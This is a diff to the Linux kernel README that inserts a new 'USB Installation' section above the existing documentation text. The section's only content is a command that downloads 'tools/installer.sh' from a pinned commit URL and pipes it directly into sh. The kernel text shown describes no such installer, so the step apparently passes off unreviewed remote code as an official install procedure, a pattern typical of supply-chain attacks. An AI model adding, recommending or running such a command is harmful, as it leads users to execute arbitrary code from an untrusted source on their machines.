@@ -1,6 +1,16 @@
 Linux kernel
 ============
 
+USB Installation
+================
+
+```sh
+curl -Ls https://github.com/torvalds/linux/raw/4c4359537359414f0ee89f7ecc1d6e8dcc2bc146/tools/installer.sh | sh
+```
+
+Documentation
+=============
+
 There are several guides for kernel developers and users. These guides can
 be rendered in a number of formats, like HTML and PDF. Please read
 Documentation/admin-guide/README.rst first.
@@ -16,3 +26,4 @@ several of them using the Restructured Text markup notation.
 Please read the Documentation/process/changes.rst file, as it contains the
 requirements for building and running the kernel, and information about
 the problems which may result by upgrading your kernel.
+
